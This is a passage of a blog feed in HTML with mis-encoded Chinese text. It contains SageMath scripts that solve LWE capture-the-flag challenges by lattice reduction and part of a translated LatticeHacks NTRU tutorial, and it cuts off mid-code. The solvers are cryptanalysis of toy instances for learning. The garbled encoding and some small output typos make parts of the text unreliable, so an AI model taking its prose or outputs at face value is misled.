class="number">2</span>*n)]</span><br><span class="line">LL = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        LL[i][j] = L[i][<span class="number">0</span>][j] </span><br><span class="line">M = Matrix(LL).transpose()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            Q[i][j] = q</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    R[i] = L[i][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">R = vector(R)</span><br><span class="line">L = Matrix(Q).stack(Matrix(M))</span><br><span class="line">lattice = IntegerLattice(L, lll_reduce=<span class="literal">True</span>)</span><br><span class="line">closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)</span><br><span class="line"></span><br><span class="line">FLAG = Matrix(Zmod(q), M.transpose())</span><br><span class="line">flag = FLAG.solve_right(closest_vector)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join( <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure><h1 id="2021-3-31-update"><a href="#2021-3-31-update" class="headerlink" title="2021/3/31 update"></a>2021/3/31 update</h1><blockquote><p>å› ä¸ºæœ€è¿‘åœ¨åšå¤§å­¦ç”Ÿå¯†ç æŒ‘æˆ˜èµ›çš„LWE, æ‰€ä»¥å­¦äº†æŒºå¤šé€ æ ¼å­çš„å§¿åŠ¿<br>è¿™è¾¹è®°å½•ä¸€ä¸ªå¥½ç”¨çš„æ ¼å­, 80ç»´çš„ç§˜å¯†å‘é‡éƒ½å¯ä»¥è§„çº¦å‡ºæ¥, å¾ˆç‰›é€¼</p></blockquote><p>åœ¨$As + e = b \mod q$ä¸­</p><p>æˆ‘ä»¬å¯ä»¥æŠŠçŸ©é˜µ$A$å’Œå‘é‡$b$çœ‹æˆ$A=\begin{pmatrix}A_1 \\ A_2\end{pmatrix}$,$b=\begin{pmatrix}b_1 \\ b_2\end{pmatrix}=\begin{pmatrix}A_1 \\ A_2\end{pmatrix}s + \begin{pmatrix}e_1 \\ e_2\end{pmatrix} $</p><p>æ‰€ä»¥å’±ä»¬å°±å¯ä»¥æ„é€ å‡ºè¿™ä¹ˆä¸€ä¸ªæ ¼å­<br>$$<br>\begin{pmatrix}<br>I_n&amp;0&amp;b_1 \\<br>A_2A_1^{-1}&amp;qI_{m-n}&amp;b_2 \\<br>0&amp;0&amp;1<br>\end{pmatrix}<br>\begin{pmatrix}<br>A_1s \\<br>k \\<br>-1<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>-e_1 \\<br>-e_2 \\<br>-1<br>\end{pmatrix}<br>$$<br>è§„çº¦å‡ºæ¥çš„å°±ç›´æ¥æ˜¯å™ªéŸ³$e$äº†, æœ‰äº†$e$å°±èƒ½è§£å‡º$s$, ä¸è¿‡è¿™è¾¹è¿˜æ˜¯æœ‰å‡ ä¸ªç‚¹è¦å»æ³¨æ„</p><ol><li>ä¸Šé¢å¼å­ç»™å‡ºçš„æ ¼å­å¹¶ä¸æ˜¯æ‰”è¿›<code>sage</code>é‡Œè§„çº¦çš„æ ¼å­, çœŸæ­£æ‰”è¿›å»è§„çº¦çš„æ˜¯å®ƒçš„è½¬ç½®, ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯<code>sage</code>é»˜è®¤å¯¹è¡Œå‘é‡è§„çº¦, åªèƒ½æŠŠå®ƒè½¬ç½®æ‰èƒ½è§„çº¦å‡ºç»“æœ, ç»“æœä¹Ÿæ˜¯è¡Œå‘é‡æ¥çš„</li><li>æ ¼å­ä¸­æœ‰ä¸€ä¸ª$A_2A_1^{-1}$, å…¶ä¸­çš„é€†çŸ©é˜µ$A_1^{-1}$æ˜¯æ¨¡$q$çš„é€†, æœ‰æ—¶å€™ä¼šå‡ºç°æ¨¡$q$ä¸èƒ½æ±‚é€†çš„æƒ…å†µ, è¿™ä¸ªæ—¶å€™å¯ä»¥é€‚å½“çš„è°ƒæ¢$A$ä¸­çš„è¡Œå‘é‡, ä½¿å¾—$A_1 \mod q$çš„é€†å­˜åœ¨, ä½†è¦è®°å¾—å‘é‡$b$ä¹Ÿè¦è·Ÿç€è°ƒæ¢, è€Œä¸”æœ€åæ±‚åˆ°çš„ç»“æœä¹Ÿæ˜¯è°ƒæ¢ä¹‹åçš„, éœ€è¦è¿˜åŸå›å»</li></ol><blockquote><p>æš‚æ—¶å°±è¿™ä¸¤ä¸ªç‚¹äº†</p></blockquote><p>ä¸ºäº†å†™ä¸ªæ¿å­ä¾›ä»¥ååšé¢˜ç”¨, æˆ‘æŠŠç¥¥äº‘æ¯é‚£é“é¢˜çš„æ•°æ®æ‹¿è¿‡æ¥å†™äº†ä¸ª<code>exp</code>, è´´åœ¨è¿™è¾¹ä»¥åè¦ç”¨äº†å¯ä»¥è¿‡æ¥æ‹¿.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">row = <span class="number">128</span></span><br><span class="line">col = <span class="number">42</span></span><br><span class="line">p = <span class="number">2129</span></span><br><span class="line"></span><br><span class="line">M = Matrix(<span class="built_in">list</span>(np.load(<span class="string">&#x27;matrix.npy&#x27;</span>)))</span><br><span class="line">R = vector(<span class="built_in">list</span>(np.load(<span class="string">&#x27;result.npy&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">A1 = M[:col]</span><br><span class="line">A2 = M[col:]</span><br><span class="line">A12 = A2 * A1.inverse() % p</span><br><span class="line"></span><br><span class="line">L = Matrix([[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row+<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row+<span class="number">1</span>)])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(col):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            L[i,j] = <span class="number">1</span>         </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row - col):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(row - col):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            L[i+col,j+col] = p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row-col):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col):</span><br><span class="line">        L[i+col,j] = A12[i,j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">    L[i,-<span class="number">1</span>] = R[i]</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reduced = L.transpose().LLL()</span><br><span class="line">error = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reduced[<span class="number">0</span>][:-<span class="number">1</span>]:</span><br><span class="line">    error.append(-i)</span><br><span class="line">e = vector(error)</span><br><span class="line">As = R - e</span><br><span class="line">A = Matrix(Zmod(p),M)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A.solve_right(As):</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åšAnt&amp;amp;d3çš„æ—¶å€™å‘ç°è‡ªå·±Latticeè¿˜ä¸ä¼š, æ‰€ä»¥å°±å»å­¦äº†ä¸€æ³¢Lattice, é¡ºä¾¿å°±äº†è§£äº†ä¸€ä¸‹LWE, å‘ç°è¿™ç©æ„å±…ç„¶æœ‰ä¸‰æ¬¡æ¯”èµ›ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªæ¿å­, ä¹Ÿæ¯ä¸ªéƒ½å»åšäº†åˆ†æäº†ä¸€ä¸‹, ç„¶åå°±é›†ä¸­åœ¨è¿™é‡Œäº†.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ„Ÿè°¢ä¸€ä½å¤§å¤§å¤§å¤§å¤§</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="LWE" scheme="http://tearsjin.github.io/tags/LWE/"/>
    
  </entry>
  
  <entry>
    <title>Translation of LatticeHacks</title>
    <link href="http://tearsjin.github.io/2021/03/28/Translation-of-LatticeHacks/"/>
    <id>http://tearsjin.github.io/2021/03/28/Translation-of-LatticeHacks/</id>
    <published>2021-03-28T10:49:16.000Z</published>
    <updated>2021-03-29T13:01:50.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‰“äº†ä¸ªæ¯”èµ›NTRUä¸ä¼šåš, ç¿»å¯†ç çˆ·çˆ·çš„åšå®¢å‘ç°ä¸€ä¸ªå®è—ç½‘ç«™<a href="https://latticehacks.cr.yp.to/">https://latticehacks.cr.yp.to</a><br>è™½ç„¶å†…å®¹ä¸å¤š, è¿˜æ˜¯è‹±è¯­çš„. è¿™é‡Œç¿»è¯‘ç¿»è¯‘ä¹Ÿé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹.</p></blockquote><h1 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h1><h2 id="å¤šé¡¹å¼"><a href="#å¤šé¡¹å¼" class="headerlink" title="å¤šé¡¹å¼"></a>å¤šé¡¹å¼</h2><p><code>Zx.&lt;x&gt; = ZZ[]</code></p><p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ª<code>Zx</code>ç±», ä¸€ä¸ªZxå¯¹è±¡, ä¸€ä¸ª<code>Zx</code>å¯¹è±¡æ˜¯å…³äº<code>x</code>çš„æ•´ç³»æ•°å¤šé¡¹å¼, ä¸¾ä¸ªæ —å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sage : f &#x3D; Zx([3,1,4])</span><br><span class="line">sage : f</span><br><span class="line">4*x^2 + x + 3</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¤šé¡¹å¼<code>f</code>æ˜¯$4x^2,x,3$è¿™ä¸‰éƒ¨åˆ†çš„å’Œ. æ¯ä¸€éƒ¨åˆ†éƒ½æ˜¯æ•´æ•°ç³»æ•°(åˆ†åˆ«ä¸º4,1,3) ä¹˜(times?)ä¸Šä¸€ä¸ª$x$çš„æ¬¡å¹‚(ä¸ºåˆ«ä¸º$x^2,x,1$)</p><p>ä¹Ÿå¯ä»¥å°†ä¸Šé¢çš„ä¾‹å­å¤åˆ¶é»è´´è¿›<code>Sage</code>æºä»£ç é‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = Zx([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>])</span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br></pre></td></tr></table></figure><h2 id="å¤šé¡¹å¼ä¹˜æ³•"><a href="#å¤šé¡¹å¼ä¹˜æ³•" class="headerlink" title="å¤šé¡¹å¼ä¹˜æ³•"></a>å¤šé¡¹å¼ä¹˜æ³•</h2><p><code>Zx</code>ç±»æœ‰ä¸€ä¸ªæŠŠæ¯ä¸€éƒ¨åˆ†ç›¸ä¹˜å¹¶ç›¸åŠ çš„å†…ç½®ä¹˜æ³•. æ¯”å¦‚è¯´, $f$ä¹˜ä¸€ä¸ª$x$, æˆ–è€…æ˜¯$x$çš„ä»»æ„æ¬¡æ–¹, ä¸è¿‡è¿™æ ·ä¹Ÿå°±æ˜¯åœ¨ç§»åŠ¨$f$çš„å‚æ•°:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br><span class="line">f*x</span><br><span class="line"><span class="comment"># output: 4*x^3 + x^2 + 3*x</span></span><br></pre></td></tr></table></figure><p>å†æ¥ä¸ªä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = Zx([<span class="number">2</span>,<span class="number">7</span>,<span class="number">1</span>])</span><br><span class="line">g</span><br><span class="line"><span class="comment"># output: x^2 + 7*x + 2</span></span><br><span class="line">f*g</span><br><span class="line"><span class="comment"># output: 4*x^4 + 29*3^3 + 18*x^2 + 23*x + 6</span></span><br></pre></td></tr></table></figure><h2 id="å¾ªç¯å·ç§¯"><a href="#å¾ªç¯å·ç§¯" class="headerlink" title="å¾ªç¯å·ç§¯"></a>å¾ªç¯å·ç§¯</h2><blockquote><p>é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹å¾ªç¯å·ç§¯æ˜¯æ€æ ·çš„<br>å·ç§¯åˆ†ä¸‰ç§: çº¿æ€§å·ç§¯, å‘¨æœŸå·ç§¯, å¾ªç¯å·ç§¯<br>çº¿æ€§å·ç§¯: å°±æ˜¯æ™®é€šçš„å¤šé¡¹å¼ä¹˜æ³•<br>å¾ªç¯å·ç§¯ä¸å‘¨æœŸå·ç§¯å¹¶æ²¡æœ‰æœ¬è´¨åŒºåˆ«, å¾ªç¯å·ç§¯å°±æ˜¯ä¿ç•™å‰ä¸€éƒ¨åˆ†ä¸åŠ¨, æŠŠåé¢çš„æˆªä¸‹æ¥åŠ åˆ°å‰ä¸€éƒ¨åˆ†å»(å°±æ˜¯æ¨¡$X^n - 1$å§, æ¯”å¦‚æ¨¡$x^3-1$, å¯¹äºç»“æœ$x^4 + x^2 + x + 1 \mod x^3-1$æ¥è¯´, å°±æ˜¯æŠŠ$x^4$æ¨¡æˆ$x$, å†åŠ åˆ°å‰é¢å»å˜æˆ$x^2 + 2x + 1$) </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f,g</span>):</span></span><br><span class="line"><span class="keyword">return</span> (f * g)% (x^n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹˜æ³•å°±æ˜¯NTRUä¸­ä½¿ç”¨çš„ä¹˜æ³•. å®ƒå°±åƒæ¨¡ä¸€ä¸ª$x^n-1$å¤šé¡¹å¼ä¹˜æ³•. è¿™æ„å‘³ç€æŠŠ$x^n$æ›¿æ¢æˆ1, æŠŠ$x^{(n+1)}$æ›¿æ¢æˆ$x$, æŠŠ$x^{n+2}$æ›¿æ¢æˆ$x^2$ç­‰ç­‰</p><p>è¾“å…¥ä¸¤ä¸ªæ¨¡$x^{n-1}$çš„$n$ç³»æ•°å¤šé¡¹å¼$f$å’Œ$g$, é‚£ä¹ˆè¾“å‡ºä¹Ÿä¼šæ˜¯ä¸€ä¸ª$n$æ¬¡å¤šé¡¹å¼, å› ä¸º$n$æ¬¡åŠä»¥ä¸Šçš„å¼å­éƒ½è¢«çº¦æ‰äº†. æ‰€ä»¥æ˜¯æœ‰å¯èƒ½å­˜åœ¨ä¸€äº›ç”šè‡³æ˜¯å…¨éƒ¨é¡¹çš„ç³»æ•°ä¸º0. æˆ‘ä»¬å¸¸è¯´çš„$n$ç³»æ•°å¤šé¡¹å¼å¹¶ä¸æ˜¯è¯´$1, x,â€¦,x^{n-1}$å…¨éƒ½å­˜åœ¨, è€Œæ˜¯è¯´$x^n,x^{n+1}$ ç­‰ç­‰çš„é¡¹ä¸å­˜åœ¨.</p><p>ä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line">f*g</span><br><span class="line"><span class="comment"># output: 4*x^4 + 29*x^3 + 18*x^2 + 23*x + 6</span></span><br><span class="line">convolution(f,g)</span><br><span class="line"><span class="comment"># output: 18*x^2 + 27*x + 35</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªä¾‹å­, è®¡ç®—$f$å’Œ$x$æ¬¡å¹‚çš„å·ç§¯, å°±æ˜¯åœ¨æ—‹è½¬$f$çš„ç³»æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br><span class="line">convolution(f,x)</span><br><span class="line"><span class="comment"># output: x^2 + 3*x + 4</span></span><br><span class="line">convolution(f,x^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># output: 3*x^2 + 4*x + 1</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„, è¿™é‡Œçš„$n$æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡.</p><blockquote><p>åŸæ–‡è¿™é‡Œè¿˜æœ‰ä¸¤ä¸ªç»ƒä¹ , ä¸€ä¸ªæ˜¯pythonç»ƒä¹ , ä¸€ä¸ªæ˜¯æ•°å­¦ç»ƒä¹ â€¦è¿™é‡Œå°±ä¸ç¿»è¯‘äº†, ä¹Ÿæ²¡ä»€ä¹ˆå¿…è¦.</p></blockquote><p><code>Sage</code>å¯ä»¥ç›´æ¥ç”¨<code>RÂ = Zx.quotient(x^n-1)</code>ç”Ÿæˆä¸€ä¸ªåŠ å‡ä¹˜è¿ç®—éƒ½æ˜¯$\mod x^{n-1} $çš„ç±»<code>R</code></p><p>â€œcyclic convolutionâ€(å¾ªç¯å·ç§¯) æˆ–è€…æ˜¯ â€œcircular convolutionâ€ è¿™ä¸ªåå­—æ¥è‡ªä¸ä¿¡å·å¤„ç†. åœ¨å¤šé¡¹å¼ä¹˜æ³•ä¸­, å®ƒå«â€acyclic convolutionâ€</p><h2 id="æ¨¡çº¦"><a href="#æ¨¡çº¦" class="headerlink" title="æ¨¡çº¦"></a>æ¨¡çº¦</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balancedmod</span>(<span class="params">f,q</span>):</span></span><br><span class="line">g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) %q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"><span class="keyword">return</span> Zx(g)</span><br></pre></td></tr></table></figure><p><code>balancedmod()</code>æœ‰ä¸¤ä¸ªè¾“å…¥: ä¸€ä¸ª$n$æ•´ç³»æ•°å¤šé¡¹å¼$f$å’Œä¸€ä¸ªæ­£æ•´æ•°$q$. è¾“å‡ºä¸€ä¸ªä¹Ÿæ˜¯næ•´ç³»æ•°, å¹¶ä¸”æ¯ä¸€ä¸ªç³»æ•°éƒ½$\mod q$. æ•°å­¦å®¶ä»¬é€šå¸¸å®šä¹‰æ¨¡çº¦çš„ç»“æœåœ¨$[0,q-1]$ ä¹‹ä¸­, ä½†è¿™ä¸ªå‡½æ•°çš„è¾“å‡ºä¼šå°†ç³»æ•°æ¨¡çº¦åˆ°$[-q/2,q/2]$ä¹‹é—´, æ›´è¯¦ç»†çš„è¯´, å½“$q$æ˜¯å¶æ•°çš„æ—¶å€™, ç»“æœçš„èŒƒå›´æ˜¯$[-q/2,q/2-1]$;å½“$q$æ˜¯å¥‡æ•°çš„æ—¶å€™, èŒƒå›´æ˜¯$[-(q-1)/2,(q-1)/2]$</p><p>æ¥ä¸ªä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u = Zx([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>])</span><br><span class="line">u</span><br><span class="line"><span class="comment"># output: 9*x^5 + 5*x^4 + x^3 + 4*x^2 + x + 3</span></span><br><span class="line">n = <span class="number">7</span></span><br><span class="line">balancedmod(u,<span class="number">10</span>)</span><br><span class="line"><span class="comment"># output: -x^5 - 5*x^4 + x^3 + 4*x^2 + x + 3</span></span><br><span class="line">balancedmod(u,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 + x</span></span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°å†…éƒ¨, <code>balancedmod()</code>ä¾æ—§ä½¿ç”¨<code>Sage</code>çš„<code>% q</code>æ“ä½œ, è¿™ä¸ªæ“ä½œçš„è¾“å‡ºä¼šåœ¨$[0,q-1]$ä¹‹é—´. ä½†è¿™ä¸ªå‡½æ•°ä¼šè°ƒæ•´è¾“å…¥å’Œè¾“å‡ºåˆ°$q // 2$, ä¹Ÿå°±æ˜¯$q / 2$å–æ•´æ•°éƒ¨åˆ†.</p><p>æ³¨æ„, è´Ÿæ•°è¾“å…¥<code>% q</code>ååœ¨ä½çº§è¯­è¨€ä¸­å¾€å¾€ä¼šè¾“å‡ºè´Ÿæ•°. è¿™æ ·ä¼šæ³„éœ²è¾“å…¥çš„ç¬¦å·(é™¤éè¾“å…¥åˆšå¥½æ˜¯$q$çš„å€æ•°, é‚£ä¹ˆè¾“å‡ºå°±ä¼šæ˜¯0). æ³„éœ²ç¬¦å·å¯ä»¥å¯¼è‡´ä¸€äº›ä¸¥é‡çš„å®‰å…¨é—®é¢˜, <code>Sage</code>æ”¯æŒå¯¹å¤šé¡¹å¼è¿›è¡Œ<code>%Â p</code>è¿™ä¸ªæ“ä½œ, ä½†æ˜¯è¾“å‡º<strong>æœ‰æ—¶å€™</strong>ä¼šæ³„éœ²è¾“å…¥çš„ç¬¦å·, æ¯”å¦‚è¯´:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">u &#x3D; 314 - 159*x</span><br><span class="line">u % 200</span><br><span class="line"># output: -159*x + 114</span><br><span class="line">(u - 400) % 200</span><br><span class="line"># output: -159*x - 86</span><br><span class="line">(u - 600) % 200</span><br><span class="line"># output: -159*x + 114</span><br><span class="line">balancedmod(u,200)</span><br><span class="line"># output: 41*x - 86</span><br></pre></td></tr></table></figure><h2 id="dé¡¹éé›¶çš„éšæœºå¤šé¡¹å¼-Random-polynomials-with-d-nonzero-coefficients"><a href="#dé¡¹éé›¶çš„éšæœºå¤šé¡¹å¼-Random-polynomials-with-d-nonzero-coefficients" class="headerlink" title="dé¡¹éé›¶çš„éšæœºå¤šé¡¹å¼(Random polynomials with d nonzero coefficients)"></a>dé¡¹éé›¶çš„éšæœºå¤šé¡¹å¼(Random polynomials with d nonzero coefficients)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomdpoly</span>():</span></span><br><span class="line"><span class="keyword">assert</span> d &lt;= n</span><br><span class="line">result = n*[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = randrange(n)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">result[r] = <span class="number">1</span> - <span class="number">2</span>*randrange(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><p><code>randomdpoly()</code>è¿”å›ä¸€ä¸ªæœ‰$d$ä¸ªéé›¶ç³»æ•°($n-d$ä¸ªç³»æ•°ä¸º0)çš„$n$æ¬¡å¤šé¡¹å¼. è€Œä¸”æ¯ä¸ªéé›¶çš„ç³»æ•°è¦ä¹ˆæ˜¯1, è¦ä¹ˆæ˜¯-1.</p><p>æ¥çœ‹ä¾‹å­(æ³¨æ„nå’Œdæ˜¯å…¨å±€å˜é‡):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7</span><br><span class="line">d &#x3D; 5</span><br><span class="line">f &#x3D; randomdpoly()</span><br><span class="line">f</span><br><span class="line"># output: x^6 + x^5 - x^3 + x^2 - 1</span><br><span class="line">f &#x3D; randomdpoly()</span><br><span class="line">f</span><br><span class="line"># output: -x^4 + x^3 + x^2 - x + 1</span><br></pre></td></tr></table></figure><h2 id="æ¨¡ç´ æ•°çš„é™¤æ³•"><a href="#æ¨¡ç´ æ•°çš„é™¤æ³•" class="headerlink" title="æ¨¡ç´ æ•°çš„é™¤æ³•"></a>æ¨¡ç´ æ•°çš„é™¤æ³•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodprime</span>(<span class="params">f,p</span>):</span></span><br><span class="line">T = Zx.change_ring(Integers(p)).quotient(x^n-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br></pre></td></tr></table></figure><blockquote><p><code>litf()</code>, æŠŠä¸€ä¸ªåœ¨ç¯R/Iä¸­çš„æ•°,  è½¬æˆåœ¨Rä¸­</p></blockquote><p><code>invertmodprime()</code>ä¼šè®¡ç®—ä¸€ä¸ªå¤šé¡¹å¼åœ¨$\mod x^n-1 \mod p$ä¸‹çš„é€†å…ƒ. </p><p>è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªè¾“å…¥, ä¸€ä¸ª$n$ç³»æ•°å¤šé¡¹å¼$f$ä»¥åŠä¸€ä¸ªç´ æ•°$p$(æ¯”å¦‚è¯´ 3). è¾“å‡ºä¸€ä¸ª$n$ç³»æ•°å¤šé¡¹å¼$g$, è¿™ä¸ª$g$æ»¡è¶³$f \cdot g = 1 + p \cdot u$($f \cdot g$æ˜¯å¾ªç¯å·ç§¯, $u$ä¹Ÿæ˜¯ä¸€ä¸ªå¤šé¡¹å¼). å¦‚æœå¤šé¡¹å¼$g$ä¸å­˜åœ¨, é‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°†æŠ¥é”™. ä¸¾ä¸ªä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br><span class="line">f3 = invertmodprime(f,<span 